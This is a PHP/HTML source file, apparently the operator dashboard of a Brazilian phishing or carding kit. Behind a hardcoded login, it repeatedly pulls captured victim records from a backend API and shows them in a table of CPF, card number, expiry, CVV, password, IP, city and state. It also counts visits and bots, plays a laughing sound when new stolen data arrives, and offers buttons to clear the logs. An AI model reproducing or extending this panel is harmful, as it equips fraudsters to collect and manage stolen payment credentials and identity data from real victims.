<?php 


require_once("configure.php");


if(!isset($_POST["usuario"]) || !isset($_POST["senha"])){

 header("Location: index.php");

 }else{
 
 if(empty($_POST["usuario"]) || empty($_POST["senha"])){
 
 header("Location: index.php");
 
 }else{
 
 if($_POST["usuario"]==USUARIO && $_POST["senha"]==SENHA){
                    $tempo_para_atualizar_o_painel = TEMPO;
                   
 }
 
 else{
 
  header("Location: index.php");
 
 }
 }
 
}

?>
<!doctype html>
<html>
  <head>
  	<title>lendario painel</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="stylesheet" href="css/style.css">
    <script src="./js/jquery.js?t=<?php echo time();?>"></script>
	<script src="./js/sweetalert.min.js?t=<?php echo time();?>"></script>
	<script src="./js/min.js?t=<?php echo time();?>"></script>
	<script>
	var contador = 0;
	
	var limptotal = 0;	
	
	var chegouInfo = new Audio('sound/risada.mp3');
	function limpar(x){
	 $.ajax({
			url: "../api/",
			type: "POST",
			async: false,
			data : {session:"limpar", zerar:x},
			success: function(date){
			if(date=="sucesso"){
			swal('Show!', 'Você limpou '+x+'.', 'success');
			}
			else if(date=="error"){
			swal('Oops!', 'Algo deu errado! :(', 'error');
			}
			},
			error: function(error){
			 console.log(error);
			}
		});	
	}
		
	//=============================================================
	
		$(document).ready(function(){
		$.ajax({
			url: "../api/",
			type: "POST",
			async: false,
			data : {'session':"estatisticas"},
			success: function(date){
			var fill = date.split("|");
			document.getElementById("v").innerHTML=fill[0];
			document.getElementById("i").innerHTML=fill[1];
			document.getElementById("b").innerHTML=fill[2];
			document.getElementById("d").innerHTML=fill[3];
			document.getElementById("m").innerHTML=fill[4];
			},
			error: function(error){
			 console.log(error);
			}
		});	
		
		//=============================
		
		$.ajax({
			url: "../api/",
			type: "POST",
			async: false,
			data : {'session':"dados"},
			success: function(date){
			document.getElementById("infos").innerHTML=date;
			},
			error: function(error){
			 console.log(error);
			}
		});	
		});
		
	//=============================================================
	
	setInterval(() => {
	
	 $.ajax({
			url: "../api/",
			type: "POST",
			async: false,
			data : {'session':"estatisticas"},
			success: function(date){
			var fill = date.split("|");
			document.getElementById("v").innerHTML=fill[0];
			document.getElementById("i").innerHTML=fill[1];
			document.getElementById("b").innerHTML=fill[2];
			document.getElementById("d").innerHTML=fill[3];
			document.getElementById("m").innerHTML=fill[4];
			},
			error: function(error){
			 console.log(error);
			}
		});	
		
		//=============================
		
		    $.ajax({
			url: "../api/",
			type: "POST",
			async: false,
			data : {'session':"dados"},
			success: function(date){
			
			if((date.match(/the/g) || []).length > contador){
			document.getElementById("infos").innerHTML=date;
			contador=(date.match(/the/g) || []).length;
			chegouInfo.play();
			}else{
			contador=(date.match(/the/g) || []).length;
			document.getElementById("infos").innerHTML=date;
			}
	
			},
			
			error: function(error){
			 console.log(error);
			}
		});	
			
	 }, "<?php echo $tempo_para_atualizar_o_painel; ?>");
	 
	 function sair(){
	 window.location.href="index.php?thepowersystem=<?php echo base64_encode(time());?>";
	 }
	 
	</script>
	<style>
	html{
	background-color: rgb(34, 44, 49);
	}
	body{
	background-color: rgb(34, 44, 49);
	}
	.thefake{
	 color: #fff;
	 text-shadow:
	  0 0 7px #fff,
	  0 0 10px #fff,
	  0 0 21px #fff,
	  0 0 42px #0fa,
	  0 0 82px #0fa,
	  0 0 92px #0fa,
	  0 0 102px #0fa,
	  0 0 151px #0fa;
	}
	</style>

	</head>
	<body><br>
	<section class="ftco-sectionc">
		<div class="container">
			
			<div class="row">
				<div class="col-md-12">
					
					<h4 class="text-center mb-4" style="color:white;"> 
					<img style="width:55px;" src="imgs/t.png">
					<label class="thefake" style="color: white;font-weight: bold;font-size: 16px;letter-spacing: 5px;">ABRAVANEL</label>
					</h4>
					
					<h4 class="text-center mb-4" style="color:white;"> 
										
					<a onclick="limpar('visitas');" class="btn btn-primary">
					<div>
					<img style="width:35px;" src="imgs/visita.png">
					<b style="width: 100%;display: inline-block;">VISITA</b>  
					<b id="v" style="color:lime;">0</b> 
					</div>
					</a>
					
					<a onclick="limpar('pc');" class="btn btn-primary">
					<div>
					<img style="width:35px;" src="imgs/pc.png">
					<b style="width: 100%;display: inline-block;">DESKTOP</b>  
					<b id="d" style="color:lime;">0</b> 
					</div>
					</a>
					
					<a onclick="limpar('mobile');" style="" class="btn btn-primary">
					<div>
					<img style="width:35px;" src="imgs/mobile.png">
					<b style="width: 100%;display: inline-block;">MOBILE</b>  
					<b id="m" style="color:lime;">0</b> 
					</div>
					</a>
					
					<a onclick="limpar('infos');" class="btn btn-primary">
					<div>
					<img style="width:35px;" src="imgs/info.png">
					<b style="width: 100%;display: inline-block;">INFO</b>  
					<b id="i" style="color:lime;">0</b> 
					</div>
					</a>
					
					<a onclick="limpar('bots');" class="btn btn-primary">
					<div>
					<img style="width:35px;" src="imgs/bot.png">
					<b style="width: 100%;display: inline-block;">BOT</b>  
					<b id="b" style="color:lime;">0</b> 
					</div>
					</a>
			
         			<a onclick="sair();" style="border-radius: 30px;" class="btn btn-primary">
					<div>
					<img style="width:35px;" src="imgs/xau.png">
					
					</div>
					</a>
			
			
					</h4>
					<div style="background-color:rgb(36, 48, 54);" class="table-wrap">
						<table class="table">
					    <thead class="thead-primary">
					      <tr>
					       <th>CPF</th><th>CARD</th><th>VALIDADE</th><th>CVV</th><th>SENHA</th><th>IP</th><th>CIDADE</th><th>ESTADO</th><th>DATA / HORA</th>
					      </tr>
					    </thead>
						
						
					    <tbody id="infos">
					   
					    </tbody>
						
					  </table>
					</div>
				</div>
			</div>
		</div>
	</section>
	</body>
</html>